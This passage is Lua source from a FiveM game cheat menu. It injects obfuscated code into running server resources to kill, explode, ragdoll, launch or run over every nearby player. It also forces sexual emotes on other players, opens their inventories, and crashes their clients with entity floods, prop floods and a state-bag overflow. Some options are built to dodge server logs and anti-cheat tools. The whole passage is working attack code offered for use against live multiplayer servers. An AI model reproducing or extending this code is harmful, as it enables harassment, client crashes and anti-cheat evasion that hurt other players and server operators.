                                    mAxPlErOy,
                                    true,
                                    false,
                                    100.0
                                )
                            end
                        end
                    end
                end
            end)
        end

        pLoMkIjUhbGyTf()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        aSwDeFgHiJkLoPx = false
    ]])
end)

 MachoMenuCheckbox(ServerTabSections[2], "Kill Everyone IV", function()
    local me = GetPlayerPed(-1)
    local myCoords = GetEntityCoords(me)

    MachoInjectResource2(3, "monitor", string.format([[
        local myPos = vector3(%f, %f, %f)
        local me = GetPlayerPed(-1)
        local weaponHash = 0x1B06D571
        
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)
            
            if targetPed ~= me and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(myPos - targetCoords)

                if distance <= 300.0 then
                    local head = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                    
                    local twin = ClonePed(targetPed, GetEntityHeading(targetPed), true, false)
                    
                    if DoesEntityExist(twin) then
                        SetEntityVisible(twin, false, false)
                        SetEntityAlpha(twin, 0, false)
                        SetEntityCollision(twin, false, false)
                        SetEntityCoords(twin, targetCoords.x, targetCoords.y, targetCoords.z - 5.0, false, false, false, true)
                        
                        GiveWeaponToPed(twin, weaponHash, 1, false, true)

                        ShootSingleBulletBetweenCoords(
                            head.x, head.y, head.z + 0.1, 
                            head.x, head.y, head.z, 
                            250,   
                            true,   
                            weaponHash, 
                            me,   
                            true,   
                            false,  
                            1000.0  
                        )

                        SetEntityAsMissionEntity(targetPed, true, true)
                        SetEntityHealth(targetPed, 0)

                        Citizen.SetTimeout(500, function()
                            if DoesEntityExist(twin) then DeleteEntity(twin) end
                        end)
                    end
                end
            end
        end
    ]], myCoords.x, myCoords.y, myCoords.z))
end)


MachoMenuCheckbox(ServerTabSections[2], "Kill Everyone V (Bypass Logs)", function()
    local me = GetPlayerPed(-1)
    local myCoords = GetEntityCoords(me)

    MachoInjectResource2(3, "monitor", string.format([[
        local myPos = vector3(%f, %f, %f)
        local me = GetPlayerPed(-1)
        local weaponHash = 0x1B06D571
        
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)
            
            if targetPed ~= me and DoesEntityExist(targetPed) then
                local targetCoords = GetEntityCoords(targetPed)
                local distance = #(myPos - targetCoords)

                if distance <= 300.0 then
                    local head = GetPedBoneCoords(targetPed, 31086, 0.0, 0.0, 0.0)
                    
                    local twin = ClonePed(targetPed, GetEntityHeading(targetPed), true, false)
                    
                    if DoesEntityExist(twin) then
                        SetEntityVisible(twin, false, false)
                        SetEntityAlpha(twin, 0, false)
                        SetEntityCollision(twin, false, false)
                        SetEntityCoords(twin, targetCoords.x, targetCoords.y, targetCoords.z - 5.0, false, false, false, true)
                        
                        GiveWeaponToPed(twin, weaponHash, 1, false, true)

                        ShootSingleBulletBetweenCoords(
                            head.x, head.y, head.z + 0.1, 
                            head.x, head.y, head.z, 
                            250,   
                            true,   
                            weaponHash, 
                            twin,   
                            true,   
                            false,  
                            1000.0  
                        )

                        SetEntityAsMissionEntity(targetPed, true, true)
                        SetEntityHealth(targetPed, 0)

                        Citizen.SetTimeout(500, function()
                            if DoesEntityExist(twin) then DeleteEntity(twin) end
                        end)
                    end
                end
            end
        end
    ]], myCoords.x, myCoords.y, myCoords.z))
end)

MachoMenuCheckbox(ServerTabSections[2], "Permanent Kill Everyone", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
        qWeRtYuIoPlMnAb = true

        local function bZxLmNcVqPeTyUi()
            local vBnMkLoPi = PlayerPedId()
            local wQaSzXedC = GetHashKey("WEAPON_PISTOL")
            local eDxCfVgBh = 100
            local lKjHgFdSa = 1000.0
            local mAxPlErOy = 300.0

            local rTwEcVzUi = CreateThread
            local oPiLyKuJm = ShootSingleBulletBetweenCoords

            rTwEcVzUi(function()
                while qWeRtYuIoPlMnAb and not Unloaded do
                    Wait(eDxCfVgBh)
                    local aSdFgHjKl = GetActivePlayers()
                    local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                    for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                        local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                        if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                            local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                            if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                local jUiKoLpMq = vector3(
                                    zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                    zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                    zAsXcVbNm.z + 1.2
                                )

                                local cReAtEtHrEaD = vector3(
                                    zAsXcVbNm.x,
                                    zAsXcVbNm.y,
                                    zAsXcVbNm.z + 0.2
                                )

                                oPiLyKuJm(
                                    jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                    cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                    lKjHgFdSa,
                                    true,
                                    wQaSzXedC,
                                    vBnMkLoPi,
                                    true,
                                    false,
                                    100.0
                                )
                            end
                        end
                    end
                end
            end)
        end

        bZxLmNcVqPeTyUi()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        qWeRtYuIoPlMnAb = false
    ]])
end)

 MachoMenuCheckbox(ServerTabSections[2], "RPG Kill Everyone", function()
     if not HasValidKey() then return end
    
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
         if tUOgshhvIaku == nil then tUOgshhvIaku = false end
         tUOgshhvIaku = true

         local function bZxLmNcVqPeTyUi()
             local vBnMkLoPi = PlayerPedId()
             local wQaSzXedC = GetHashKey("WEAPON_PASSENGER_ROCKET")
             local eDxCfVgBh = 100
             local lKjHgFdSa = 1000.0
             local mAxPlErOy = 300.0

             local rTwEcVzUi = CreateThread
             local oPiLyKuJm = ShootSingleBulletBetweenCoords

             rTwEcVzUi(function()
                 while tUOgshhvIaku and not Unloaded do
                     Wait(eDxCfVgBh)
                     local aSdFgHjKl = GetActivePlayers()
                     local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                     for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                         local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                         if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                             local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                             if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                 local jUiKoLpMq = vector3(
                                     zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                     zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                     zAsXcVbNm.z + 1.2
                                 )

                                 local cReAtEtHrEaD = vector3(
                                     zAsXcVbNm.x,
                                     zAsXcVbNm.y,
                                     zAsXcVbNm.z + 0.2
                                 )

                                 oPiLyKuJm(
                                     jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                     cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                     lKjHgFdSa,
                                     true,
                                     wQaSzXedC,
                                     vBnMkLoPi,
                                     true,
                                     false,
                                     100.0
                                 )
                             end
                         end
                     end
                 end
             end)
         end

         bZxLmNcVqPeTyUi()
     ]])
 end, function()
     MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
         tUOgshhvIaku = false
     ]])
 end)

MachoMenuCheckbox(ServerTabSections[2], "Drop Vehicles Everyone", 
    function()
        local rawInput = MachoMenuGetInputbox(CarModelInput)
        if rawInput == "" or rawInput == "..." then rawInput = "jugular,marquis,neon" end

        MachoInjectResource2(2, "monitor", string.format([[
            _G.RainLoop = true
            local rawModels = "%s"
            local vehicleList = {}
            
            for model in string.gmatch(rawModels, "([^,]+)") do
                local trimmed = model:gsub("^%%s*(.-)%%s*$", "%%1")
                table.insert(vehicleList, GetHashKey(trimmed))
            end

            Citizen.CreateThread(function()
                -- Load lahat ng models sa listahan
                for _, hash in ipairs(vehicleList) do RequestModel(hash) end

                while _G.RainLoop do
                    local players = GetActivePlayers()
                    for i = 1, #players do
                        local target = GetPlayerPed(players[i])
                        if target ~= 0 and DoesEntityExist(target) then 
                            local coords = GetEntityCoords(target)
                            
                            for _, hash in ipairs(vehicleList) do
                                if HasModelLoaded(hash) then
                                    -- Lagyan natin ng konting random offset (x, y) 
                                    -- para hindi sila mag-stuck sa isa't isa habang nahuhulog
                                    local offsetX = math.random(-2, 2) + 0.0
                                    local offsetY = math.random(-2, 2) + 0.0
                                    
                                    local veh = CreateVehicle(hash, coords.x + offsetX, coords.y + offsetY, coords.z + 35.0, 0.0, true, false)
                                    SetEntityAsNoLongerNeeded(veh)
                                    
                                    ApplyForceToEntity(veh, 3, 0.0, 0.0, -200.0, 0.0, 0.0, 0.0, 0, false, true, true, false, true)
                                end
                            end
                        end
                        Wait(100) 
                    end
                    Wait(1500) 
                end
            end)
        ]], rawInput))
    end,
    
    function()
        MachoInjectResource2(2, "monitor", [[ _G.RainLoop = false ]])
    end
)


MachoMenuCheckbox(ServerTabSections[2], "Vdm Everyone", 
    
    function()
        local rawInput = MachoMenuGetInputbox(CarModelInput)
        if rawInput == "" or rawInput == "..." then rawInput = "jugular" end

        MachoInjectResource2(2, "monitor", string.format([[
            _G.RunSteadyVDM = true
            local rawModels = "%s"
            local vehicleList = {}

            for model in string.gmatch(rawModels, "([^,]+)") do
                local trimmed = model:gsub("^%%s*(.-)%%s*$", "%%1")
                table.insert(vehicleList, GetHashKey(trimmed))
            end

            Citizen.CreateThread(function()
                for _, hash in ipairs(vehicleList) do RequestModel(hash) end

                while _G.RunSteadyVDM do
                    local players = GetActivePlayers()
                    for i = 1, #players do
                        local target = GetPlayerPed(players[i])
                        if target ~= 0 and DoesEntityExist(target) then
                            local pos = GetEntityCoords(target)
                            local fwd = GetEntityForwardVector(target)
                            
                            local sPos = pos + (fwd * -15.0) + vector3(math.random(-1,1), math.random(-1,1), 0.5)
                            local randomHash = vehicleList[math.random(1, #vehicleList)]

                            if HasModelLoaded(randomHash) then
                                local veh = CreateVehicle(randomHash, sPos.x, sPos.y, sPos.z, 0.0, true, false)
                                if DoesEntityExist(veh) then
                                    SetVehicleNumberPlateText(veh, "STEADY")
                                    
                                    local dir = pos - sPos
                                    local mag = math.sqrt(dir.x^2 + dir.y^2 + dir.z^2)
                                    SetEntityVelocity(veh, (dir.x/mag)*95.0, (dir.y/mag)*95.0, (dir.z/mag)*95.0)
                                    
                                    SetEntityAsNoLongerNeeded(veh)
                                    
                                    Citizen.SetTimeout(1200, function()
                                        if DoesEntityExist(veh) then DeleteEntity(veh) end
                                    end)
                                end
                            end
                        end
                        Wait(50) 
                    end
                    Wait(1000) 
                end
            end)
        ]], rawInput))
    end,

    function()
        MachoInjectResource2(2, "monitor", [[ _G.RunSteadyVDM = false ]])
    end
)

MachoMenuCheckbox(ServerTabSections[2], "Spawn Vehicle Explode", 
    function() 
        MachoInjectResource2(2, "monitor", [[
            _G.AutoDamageActive = true
            
            Citizen.CreateThread(function()
                local lastVeh = nil
                while _G.AutoDamageActive do
                    local myPed = PlayerPedId()
                    local currentVeh = GetVehiclePedIsIn(myPed, false)
                    
                    if currentVeh == 0 then
                        currentVeh = GetClosestVehicle(GetEntityCoords(myPed), 10.0, 0, 71)
                    end

                    if DoesEntityExist(currentVeh) and currentVeh ~= lastVeh then
                        if not NetworkHasControlOfEntity(currentVeh) then
                            NetworkRequestControlOfEntity(currentVeh)
                        end
                        
                        SetVehicleEngineHealth(currentVeh, 100.0) 
                        SetVehicleBodyHealth(currentVeh, 100.0)
                        SetVehiclePetrolTankHealth(currentVeh, 400.0) 
                        
                        SetVehicleTyreBurst(currentVeh, 0, true, 1000)
                        
                        lastVeh = currentVeh
                        print("Vehicle Damaged: Isang untog na lang, sabog na 'to.")
                    end
                    Wait(1000) 
                end
            end)
        ]])
    end,
    function() 
        MachoInjectResource2(2, "monitor", [[ _G.AutoDamageActive = false ]])
    end
)
MachoMenuCheckbox(ServerTabSections[2], "Ragdoll Everyone", 
    function() 
                                    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                                        if RagdollAll == nil then RagdollAll = false end
                                        RagdollAll = true

                                        local function startRagdollSnowball()
                                            local me = PlayerPedId()
                                            local DAMAGE        = 1               -- lowest possible damage
                                            local BULLET_SPEED  = 100.0
                                            local MAX_DISTANCE  = 400.0
                                            local TICK_MS       = 1000

                                            local DEFAULT_WEAPON = GetHashKey("WEAPON_SNOWBALL")
                                            local shoot = ShootSingleBulletBetweenCoords

                                            CreateThread(function()
                                                while aRagdollAll and not (Unloaded == true) do
                                                    Wait(TICK_MS)

                                                    if not DoesEntityExist(me) or IsPedDeadOrDying(me, true) then
                                                        me = PlayerPedId()
                                                        goto continue
                                                    end

                                                    local weaponHash = GetSelectedPedWeapon(me)
                                                    if not weaponHash or weaponHash == 0 then
                                                        weaponHash = DEFAULT_WEAPON
                                                    end

                                                    local myCoords = GetEntityCoords(me)

                                                    for _, pid in ipairs(GetActivePlayers()) do
                                                        local tgt = GetPlayerPed(pid)
                                                        if tgt ~= me and DoesEntityExist(tgt) and not IsPedDeadOrDying(tgt, true) then
                                                            local tgtCoords = GetEntityCoords(tgt)
                                                            local dist = #(tgtCoords - myCoords)

                                                            if dist <= MAX_DISTANCE then
                                                                local src = vector3(
                                                                    tgtCoords.x + (math.random() - 0.5) * 0.8,
                                                                    tgtCoords.y + (math.random() - 0.5) * 0.8,
                                                                    tgtCoords.z + 1.2
                                                                )

                                                                local dst = vector3(
                                                                    tgtCoords.x,
                                                                    tgtCoords.y,
                                                                    tgtCoords.z + 0.2
                                                                )

                                                                shoot(
                                                                    src.x, src.y, src.z,
                                                                    dst.x, dst.y, dst.z,
                                                                    DAMAGE,
                                                                    true,
                                                                    weaponHash,
                                                                    me,
                                                                    true,
                                                                    false,
                                                                    BULLET_SPEED
                                                                )

                                                                -- Apply ragdoll effect
                                                                SetPedToRagdoll(tgt, 2000, 2000, 0, false, false, false)
                                                            end
                                                        end
                                                    end

                                                    ::continue::
                                                end
                                            end)
                                        end

                                        startRagdollSnowball()
                                    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        RagdollAll = false
    ]])
end)

MachoMenuCheckbox(ServerTabSections[2], "Ragdoll Everyone II", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
    if RagdollAll2 == nil then RagdollAll2 = false end
    RagdollAll2 = true

        local SafeWrap = function(fn) return function(...) return fn(...) end end
        local SafeThread = SafeWrap(CreateThread)
        local SafeGetActivePlayers = SafeWrap(GetActivePlayers)
        local SafeGetPlayerPed = SafeWrap(GetPlayerPed)
        local SafeGetEntityCoords = SafeWrap(GetEntityCoords)
        local SafeAddExplosion = SafeWrap(AddExplosion)
        local SafeWait = SafeWrap(Citizen.Wait)

        local function InvisibleStairsForAllPlayers()
            SafeThread(function()
                local players = SafeGetActivePlayers()
                for _, playerId in ipairs(players) do
                    local playerPed = SafeGetPlayerPed(playerId)
                    if DoesEntityExist(playerPed) then
                        local pos = SafeGetEntityCoords(playerPed)
                        SafeAddExplosion(pos.x, pos.y + 0.5, pos.z - 1.8, 11, 5.0, true, true, 0.0)
                        SafeWait(50) -- מנגנון מניעת עומס
                    end
                end
            end)
        end

        InvisibleStairsForAllPlayers()
    ]])
end, function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        RagdollAll2 = false
    ]])
end)
  
local EmoteDropDownChoice = 0
local EmoteToggle = false
local EmoteThread = nil

local EmoteMap = {
    [0] = "slapped",
    [1] = "punched",
    [2] = "receiveblowjob",
    [3] = "GiveBlowjob",
    [4] = "headbutted",
    [5] = "hug4",
    [6] = "streetsexfemale",
    [7] = "streetsexmale",
    [8] = "pback2",
    [9] = "carry3",
    [10] = ".....gta298",
    [11] = ".....gta304",
    [12] = ".....gta284"

}

MachoMenuDropDown(ServerTabSections[2], "Select Emote", function(index)
    EmoteDropDownChoice = index
end,
    "Slapped",
    "Punched",
    "Give BJ",
    "Recieve BJ",
    "Headbutt",
    "Hug",
    "StreetSexFemale",
    "StreetSexMale",
    "Piggyback",
    "Carry",
    "Butt Rape",
    "Amazing Head",
    "Lesbian Scissors"
)

MachoMenuButton(ServerTabSections[2], "Force Emote", function()
    local emote = EmoteMap[EmoteDropDownChoice]
    if emote then
        MachoInjectResource2(3, CheckResource("monitor") and "monitor" or "any", string.format([[
            local function KmTpqXYzLv()
                local Rk3uVnTZpxf7Q = TriggerEvent
                Rk3uVnTZpxf7Q("ClientEmoteRequestReceive", "%s", true)
            end

            KmTpqXYzLv()
        ]], emote))
    end
end)

 MachoMenuButton(ServerTabSections[2], "Launch Everyone", function()
    local resName = "monitor" 
    local threadName = "" 

    local scriptToInject = [[
        local myPed = PlayerPedId()
        local myCoords = GetEntityCoords(myPed)
        local oldCoords = myCoords
        local targets = {}

        -- 1. SCAN FOR TARGETS WITHIN 100M
        for _, player in ipairs(GetActivePlayers()) do
            local targetPed = GetPlayerPed(player)
            if targetPed ~= myPed and DoesEntityExist(targetPed) then
                local targetPos = GetEntityCoords(targetPed)
                local dist = #(myCoords - targetPos)
                
                if dist <= 100.0 then
                    table.insert(targets, GetPlayerServerId(player))
                end
            end
        end

        print("^2[Macho] Found "..#targets.." targets for Sky Launch.^7")

        -- 2. LOOP THROUGH EACH TARGET 1 BY 1
        for _, targetServerId in ipairs(targets) do
            local targetIdx = GetPlayerFromServerId(targetServerId)
            if targetIdx ~= -1 then
                local targetPed = GetPlayerPed(targetIdx)
                
                if DoesEntityExist(targetPed) then
                    -- Reset invisibility for the new approach
                    SetEntityVisible(myPed, false, false)
                    SetEntityAlpha(myPed, 0, false)

                    local targetPos = GetEntityCoords(targetPed)
                    SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, targetPos.z, false, false, false)
                    Wait(250) 

                    -- SECURE THE CARRY
                    ExecuteCommand("carry")
                    local attached = false
                    for i = 1, 15 do
                        if IsEntityAttachedToEntity(targetPed, myPed) then
                            attached = true
                            break
                        end
                        Wait(50) 
                    end

                    -- THE LAUNCH
                    if attached then
                        local currentZ = targetPos.z
                        for i = 1, 60 do 
                            currentZ = currentZ + 40.0 
                            SetEntityCoordsNoOffset(myPed, targetPos.x, targetPos.y, currentZ, true, false, false)
                            Wait(10) 
                        end
                        
                        FreezeEntityPosition(myPed, true)
                        Wait(100)

                        -- RELEASE
                        NetworkRequestControlOfEntity(targetPed)
                        for i = 1, 5 do
                            ExecuteCommand("carry") 
                            DetachEntity(targetPed, true, true)
                            ClearPedTasksImmediately(targetPed)
                            SetPedToRagdoll(targetPed, 10000, 10000, 0, 0, 0, 0)
                            Wait(10)
                        end
                        
                        FreezeEntityPosition(myPed, false)
                        Wait(200) -- Konting hinga bago ang susunod
                    end
                end
            end
        end

        -- 3. RETURN AFTER ALL TARGETS ARE DONE
        SetEntityCoords(myPed, oldCoords.x, oldCoords.y, oldCoords.z, false, false, false, false)
        SetEntityVisible(myPed, true, false)
        ResetEntityAlpha(myPed)
        print("^1[Macho] Mass Sky Launch Completed.^7")
    ]]

    MachoInjectThread(0, resName, threadName, scriptToInject)
end) 

MachoMenuButton(ServerTabSections[2], "Open Nearest Player Inventory", function()
      MachoInjectResource('ox_inventory', [[
          local function GetClosestPlayer()
              local closestPlayer = -1
              local closestDistance = -1
              local playerPed = PlayerPedId()
              local playerCoords = GetEntityCoords(playerPed)

              for _, playerId in ipairs(GetActivePlayers()) do
                  local targetPed = GetPlayerPed(playerId)
                  if targetPed ~= playerPed then
                      local targetCoords = GetEntityCoords(targetPed)
                      local distance = #(playerCoords - targetCoords)

                      if closestDistance == -1 or distance < closestDistance then
                          closestPlayer = playerId
                          closestDistance = distance
                      end
                  end
              end

              return closestPlayer, closestDistance
          end

          local function ForceAnimationOnPlayer(ped)
              local dict = "dead"
              local anim = "dead_a"

              if not HasAnimDictLoaded(dict) then
                  RequestAnimDict(dict)
                  while not HasAnimDictLoaded(dict) do
                      Wait(10)
                  end
              end

              TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)
          end

          local closestPlayer, distance = GetClosestPlayer()

          if closestPlayer ~= -1 and distance <= 2.0 then
              local targetPed = GetPlayerPed(closestPlayer)
              ForceAnimationOnPlayer(targetPed)
              TriggerEvent('ox_inventory:openInventory', 'otherplayer', GetPlayerServerId(closestPlayer))
          end
      ]])
  end)

MachoMenuButton(ServerTabSections[2], "Crash Nearby Player", function()
    local targetResource = nil
    local resourcePriority = {"any", "any", "any"}
    local foundResources = {}
    
    for _, resourceName in ipairs(resourcePriority) do
        if GetResourceState(resourceName) == "started" then
            table.insert(foundResources, resourceName)
        end
    end
    
    if #foundResources > 0 then
        targetResource = foundResources[math.random(1, #foundResources)]
    else
        local allResources = {}
        for i = 0, GetNumResources() - 1 do
            local resourceName = GetResourceByFindIndex(i)
            if resourceName and GetResourceState(resourceName) == "started" then
                table.insert(allResources, resourceName)
            end
        end
        if #allResources > 0 then
            targetResource = allResources[math.random(1, #allResources)]
        else
            MachoMenuNotification("Crash Nearby Player", "Failed - System error!")
            return
        end
    end
    
    MachoInjectResource(targetResource, [[
        local function getClosestPlayer()
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local closestPlayer = nil
            local closestDistance = 999999.0
            
            for _, playerId in ipairs(GetActivePlayers()) do
                local targetPed = GetPlayerPed(playerId)
                if targetPed ~= 0 and targetPed ~= playerPed then
                    local targetCoords = GetEntityCoords(targetPed)
                    local distance = #(playerCoords - targetCoords)
                    
                    if distance < closestDistance then
                        closestDistance = distance
                        closestPlayer = playerId
                    end
                end
            end
            
            return closestPlayer, closestDistance
        end
        
        local function spawnInvisibleWadeBot(coords)
            local hash = GetHashKey("ig_wade")
            
            RequestModel(hash)
            while not HasModelLoaded(hash) do
                Wait(10)
            end
            
            local bot = CreatePed(4, hash, coords.x, coords.y, coords.z, math.random(0, 360), true, false)
            
            SetEntityVisible(bot, false, false)
            SetEntityAlpha(bot, 0, false)
            SetEntityCollision(bot, false, false)
            SetEntityInvincible(bot, true)
            FreezeEntityPosition(bot, true)
            SetBlockingOfNonTemporaryEvents(bot, true)
            SetPedAsNoLongerNeeded(bot)
            
            NetworkRegisterEntityAsNetworked(bot)
            SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(bot), true)
            SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(bot), false)
            
            SetModelAsNoLongerNeeded(hash)
            
            return bot
        end
        
        local function executeWadeBotSpawn()
            local closestPlayer, distance = getClosestPlayer()
            
            if closestPlayer and distance < 100.0 then
                local targetPed = GetPlayerPed(closestPlayer)
                local targetCoords = GetEntityCoords(targetPed)
                
                for i = 1, 1400 do
                    local offsetX = math.random(-100, 100) / 10.0
                    local offsetY = math.random(-100, 100) / 10.0
                    local offsetZ = math.random(-20, 20) / 10.0
                    
                    local spawnCoords = vector3(
                        targetCoords.x + offsetX,
                        targetCoords.y + offsetY,
                        targetCoords.z + offsetZ
                    )
                    
                    CreateThread(function()
                        Wait(i * 50)
                        spawnInvisibleWadeBot(spawnCoords)
                    end)
                end
                
            else
            end
        end
        
        executeWadeBotSpawn()
        RegisterKeyMapping('wadebots', 'Spawn Wade Bots on Closest Player', 'keyboard', 'F10')
    ]])
    
    MachoMenuNotification("Crash Nearby Player", "Operation completed successfully")
end)

 MachoMenuButton(ServerTabSections[2], "Crash Nearby Player II", function()
     MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("FiniAC") and "FiniAC") or (CheckResource("WaveShield") and "WaveShield") or (CheckResource("monitor") and "monitor") or "any", [[
         local function sfehwq34rw7td()
             local Nwq7sd2Lkq0pHkfa = CreateThread
             Nwq7sd2Lkq0pHkfa(function()    
                 local hAx9qTeMnb = CreateThread
                 local Jf9uZxcTwa = _G.CreatePed
                 local VmzKo3sRt7 = _G.PlayerPedId
                 local LuZx8nqTys = _G.GetEntityCoords
                 local QksL02vPdt = _G.GetEntityHeading
                 local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset
                 local PfQsXoEr6b = _G.GiveWeaponToPed
                 local WvNay7Zplm = _G.TaskParachute
                 local DjRq08bKxu = _G.FreezeEntityPosition
                 local EkLnZmcTya = _G.GetHashKey
                 local YdWxVoEna3 = _G.RequestModel
                 local GcvRtPszYp = _G.HasModelLoaded
                 local MnVc8sQaLp = _G.SetEntityAsMissionEntity
                 local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded
                 local VdNzWqbEyf = _G.DoesEntityExist
                 local AxWtRuLskz = _G.DeleteEntity
                 local OplKvms9te = _G.Wait
                 local BnQvKdsLxa = _G.GetGroundZFor_3dCoord
                 local VmxrLa9Ewt = _G.ApplyForceToEntity
                 local fwafWAefAg = _G.SetEntityVisible
                 local awrt325etd = _G.SetBlockingOfNonTemporaryEvents
                 local awfaw4eraq = _G.SetEntityAlpha

                 hAx9qTeMnb(function()
                     local QxoZnmWlae = VmzKo3sRt7()
                     local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae)
                     local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae)
                     local ZtXmqLpEas = EzPwqLtYas.z + 1600.0

                     Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)

                     VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                     OplKvms9te(250)

                     DjRq08bKxu(QxoZnmWlae, true)

                     PfQsXoEr6b(QxoZnmWlae, `gadget_parachute`, 1, false, true)
                     WvNay7Zplm(QxoZnmWlae, false)

                     DjRq08bKxu(QxoZnmWlae, true)

                     local UixZpvLoa9 = EkLnZmcTya("player_one")
                     YdWxVoEna3(UixZpvLoa9)
                     while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end

                     local TzsPlcxQam = {}
                     for K9wo = 1, 130 do
                         local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
                         if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
                             MnVc8sQaLp(IuxErv7Pqa, true, true)
                             awrt325etd(IuxErv7Pqa, true)
                             awfaw4eraq(IuxErv7Pqa, 0, true)
                             table.insert(TzsPlcxQam, IuxErv7Pqa)
                         end
                         OplKvms9te(1)
                     end

                     KrXpTuwq9c(UixZpvLoa9)

                     OplKvms9te(300)

                     for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
                         if VdNzWqbEyf(bTzyPq7Xsl) then
                             AxWtRuLskz(bTzyPq7Xsl)
                             AxWtRuLskz(bTzyPq7Xsl)
                             AxWtRuLskz(bTzyPq7Xsl)
                             AxWtRuLskz(bTzyPq7Xsl)
                             AxWtRuLskz(bTzyPq7Xsl)
                             AxWtRuLskz(bTzyPq7Xsl)
                             AxWtRuLskz(bTzyPq7Xsl)
                             AxWtRuLskz(bTzyPq7Xsl)
                         end
                     end

                     DjRq08bKxu(QxoZnmWlae, false)
                     local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, 0, false)
                     if not ZkxyPqtLs0 then
                         Zfound = EzPwqLtYas.z
                     end
                     OplKvms9te(1000)

                     Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
                     DjRq08bKxu(QxoZnmWlae, true)

                     DjRq08bKxu(QxoZnmWlae, false)
                 end)
             end)
         end

         sfehwq34rw7td()
     ]])
 end)

  MachoMenuButton(ServerTabSections[2], "Crash Nearby Player III", function()
        if GetResourceState("WaveShield") == "started" then
            MachoMenuNotification("Engkanto", "WAVESHIELD DETECTED! IT CAN BE BANNED YOU")
            return
        end
            MachoInjectResourceRaw("ox_lib", [[
                CreateObject = function() end

                local model <const> = 'p_spinning_anus_s'
                local props <const> = {}

                for i = 1, 600 do
                    props[i] = {
                        model = model,
                        coords = vec3(0.0, 0.0, 0.0),
                        pos = vec3(0.0, 0.0, 0.0),
                        rot = vec3(0.0, 0.0, 0.0)
                    }
                end

                local plyState <const> = LocalPlayer.state

                plyState:set('lib:progressProps', props, true)
                Wait(1000)
                plyState:set('lib:progressProps', nil, true)
]])
end)

MachoMenuButton(ServerTabSections[2], "Overflow Crash", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
    local BufferLimit = 131072
local Overflow = 13

local key = string.rep("y", BufferLimit + Overflow)
local value = string.rep("\0", Overflow - 1)

SetStateBagValue("global", key, value, #value, true)
     ]])
 end)


MachoMenuButton(ServerTabSections[2], "Explode All Players", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function fGhJkLpOiUzXcVb()
            local aSdFgHjKlQwErTy = GetActivePlayers
